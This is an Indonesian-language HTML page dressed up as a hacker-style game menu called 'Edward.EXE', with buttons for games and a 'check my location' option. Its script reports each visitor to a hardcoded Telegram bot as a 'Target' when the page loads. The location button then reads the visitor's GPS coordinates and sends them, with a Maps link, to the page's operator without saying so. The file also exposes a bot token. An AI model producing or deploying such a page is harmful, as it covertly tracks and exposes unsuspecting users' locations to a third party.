<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edward.EXE | System Access</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; padding: 0; background: black; overflow: hidden; font-family: 'Courier New', Courier, monospace; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        #main-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #00ff00; text-align: center; background: rgba(0, 0, 0, 0.9); padding: 25px; border: 2px solid #00ff00; border-radius: 15px; width: 85%; max-width: 400px; z-index: 10; }
        .game-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        button { background: transparent; color: #00ff00; border: 2px solid #00ff00; padding: 12px 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 0.8em; }
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; padding: 20px; box-sizing: border-box; color: #00ff00; }
        #map { width: 100%; height: 250px; border: 2px solid #00ff00; margin-top: 10px; display: none; }
        .bar-container { width: 100%; border: 1px solid #00ff00; height: 15px; margin-top: 15px; }
        .bar-fill { width: 0%; height: 100%; background: #00ff00; }
        .exit-btn { width: 100%; height: 45px; background: #ff0000; color: white; border: none; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body onload="sendTele('⚠️ INFO: Target masuk ke sistem EDWARD.EXE')">
    <canvas id="matrix"></canvas>

    <div id="main-content">
        <h2>> EDWARD.EXE</h2>
        <p style="font-size: 10px;">V.4.0 - SILENT PROTOCOL</p>
        <div class="game-menu">
            <button onclick="window.location.href='intent:#Intent;package=com.dts.freefireth;end'">FREE FIRE</button>
            <button onclick="window.location.href='minecraft://'">MINECRAFT</button>
            <button onclick="openTerminal()">TERMINAL</button>
            <button onclick="startScan()">SCAN SYSTEM</button>
            <button onclick="checkDevice()" style="grid-column: span 2;">CHECK DEVICE SENSOR</button>
            <button onclick="trackGPS()" style="grid-column: span 2; border-color: yellow; color: yellow;">📍 CEK LOKASI SAYA</button>
        </div>
    </div>

    <div id="gps-overlay" class="overlay">
        <h3>[ GPS SYSTEM ]</h3>
        <div id="gps-logs">> Menghubungkan ke satelit...</div>
        <div class="bar-container"><div id="gps-bar" class="bar-fill"></div></div>
        <div id="map"></div>
        <button class="exit-btn" onclick="closeOverlay('gps-overlay')">CLOSE</button>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // ... (Kode Matrix, Telegram Token & ID Master tetap sama) ...
        const TG_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const TG_ID = '7898572558';

        function sendTele(msg) { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}`); }
        function closeOverlay(id) { document.getElementById(id).style.display = "none"; }
        
        function trackGPS() {
            document.getElementById("gps-overlay").style.display = "block";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    let w = 0;
                    const intv = setInterval(() => {
                        w += 10; document.getElementById("gps-bar").style.width = w + "%";
                        if (w >= 100) {
                            clearInterval(intv);
                            document.getElementById("map").style.display = "block";
                            var map = L.map('map').setView([p.coords.latitude, p.coords.longitude], 15);
                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                            L.marker([p.coords.latitude, p.coords.longitude]).addTo(map);
                            sendTele(`📍 LOKASI MASUK!\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                        }
                    }, 100);
                }, () => { sendTele("❌ Lokasi ditolak."); });
            }
        }
        // (Tambahkan fungsi openTerminal & startScan dari kode sebelumnya)
        function openTerminal() { alert("Terminal Aktif..."); }
        function startScan() { alert("Scanning..."); }
        function checkDevice() { alert("Checking Device..."); }
    </script>
</body>
</html>
